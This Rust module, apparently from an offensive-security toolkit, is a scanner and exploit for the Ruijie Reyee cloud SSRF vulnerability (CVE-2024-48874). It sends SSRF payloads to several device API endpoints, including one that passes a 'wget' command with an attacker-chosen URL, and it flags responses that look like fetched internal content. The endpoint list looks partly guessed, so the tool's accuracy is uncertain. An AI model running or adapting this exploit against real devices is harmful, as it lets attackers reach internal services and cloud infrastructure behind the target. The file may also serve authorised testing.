use anyhow::Result;
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};

/// Ruijie Reyee Cloud SSRF (CVE-2024-48874)
/// 
/// Server-Side Request Forgery in Ruijie Reyee devices
/// Allows attackers to access internal services and cloud infrastructure
/// Part of "Open Sesame" vulnerability chain (Claroty Team82)
/// CVSS: High

const TIMEOUT_SECS: u64 = 15;

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    let raw_target = if target.is_empty() {
        prompt_required("Target IP/URL")?
    } else {
        target.to_string()
    };
    
    let normalized = normalize_target(&raw_target)?;
    let base_url = if normalized.contains("://") {
        normalized.clone()
    } else {
        format!("http://{}", normalized)
    };
    
    println!("{} Target: {}", "[*]".blue(), base_url);
    
    // SSRF target URL - can be internal service or callback
    let ssrf_target = prompt_default(
        "SSRF target URL (internal service or callback)", 
        "http://127.0.0.1:80/"
    )?;
    
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(TIMEOUT_SECS))
        .redirect(reqwest::redirect::Policy::none())
        .build()?;
    
    println!("{} Testing SSRF vulnerability...", "[*]".blue());
    println!("{} SSRF Target: {}", "[*]".cyan(), ssrf_target);
    
    // Various SSRF injection points in Ruijie Reyee devices
    let ssrf_endpoints = vec![
        // Cloud sync functionality
        (format!("{}/api/cloud/sync", base_url.trim_end_matches('/')),
         serde_json::json!({"url": ssrf_target, "action": "fetch"})),
        // Firmware check
        (format!("{}/api/system/checkUpdate", base_url.trim_end_matches('/')),
         serde_json::json!({"server": ssrf_target})),
        // NTP sync
        (format!("{}/api/system/ntp", base_url.trim_end_matches('/')),
         serde_json::json!({"server": ssrf_target})),
        // Remote management
        (format!("{}/cgi-bin/luci/api/remote", base_url.trim_end_matches('/')),
         serde_json::json!({"callback_url": ssrf_target})),
        // Diagnostic tool
        (format!("{}/goform/webcmd", base_url.trim_end_matches('/')),
         serde_json::json!({"cmd": "wget", "url": ssrf_target})),
    ];
    
    for (endpoint, payload) in &ssrf_endpoints {
        println!("{} Testing: {}", "[*]".dimmed(), endpoint);
        
        match client.post(endpoint).json(payload).send().await {
            Ok(resp) => {
                let status = resp.status();
                let headers = resp.headers().clone();
                let text = resp.text().await.unwrap_or_default();
                
                // Check for SSRF indicators
                let mut ssrf_detected = false;
                
                // Response contains data from internal service
                if text.contains("<!DOCTYPE") || text.contains("<html") ||
                   text.contains("Apache") || text.contains("nginx") ||
                   text.contains("Server:") {
                    ssrf_detected = true;
                    println!("{} SSRF response contains external content!", "[+]".green().bold());
                }
                
                // Timing-based detection (if request took longer, might be fetching)
                if status.is_success() && text.len() > 100 {
                    ssrf_detected = true;
                    println!("{} Got substantive response ({} bytes)", "[+]".green(), text.len());
                }
                
                // Headers indicating redirect/proxy
                if headers.contains_key("x-forwarded-for") || 
                   headers.contains_key("via") {
                    println!("{} Proxy headers detected", "[+]".yellow());
                }
                
                if ssrf_detected {
                    println!("{} SSRF DETECTED at {}!", "[VULN]".red().bold(), endpoint);
                    println!("{} Response preview:", "[*]".blue());
                    println!("{}", &text[..text.len().min(500)]);
                    return Ok(());
                }
                
                if status.is_success() {
                    println!("{} HTTP {} - Endpoint accessible", "[*]".yellow(), status);
                }
            },
            Err(e) => {
                println!("{} Failed: {}", "[*]".dimmed(), e);
            }
        }
    }
    
    // Test with URL as GET parameter
    let get_endpoints = vec![
        format!("{}/?url={}", base_url.trim_end_matches('/'), urlencoding::encode(&ssrf_target)),
        format!("{}/proxy?target={}", base_url.trim_end_matches('/'), urlencoding::encode(&ssrf_target)),
    ];
    
    for endpoint in &get_endpoints {
        if let Ok(resp) = client.get(endpoint).send().await {
            let text = resp.text().await.unwrap_or_default();
            if text.len() > 100 && !text.contains("error") && !text.contains("404") {
                println!("{} Possible SSRF via GET: {}", "[+]".yellow(), endpoint);
            }
        }
    }
    
    println!();
    println!("{} SSRF not confirmed through standard endpoints.", "[*]".yellow());
    println!("{} Consider using out-of-band detection (OAST/callback).", "[*]".cyan());
    println!("{} Part of 'Open Sesame' chain - requires full exploit chain for RCE.", "[*]".cyan());
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║   Ruijie Reyee Cloud SSRF (CVE-2024-48874)                ║".cyan());
    println!("{}", "║   Part of 'Open Sesame' Vulnerability Chain              ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
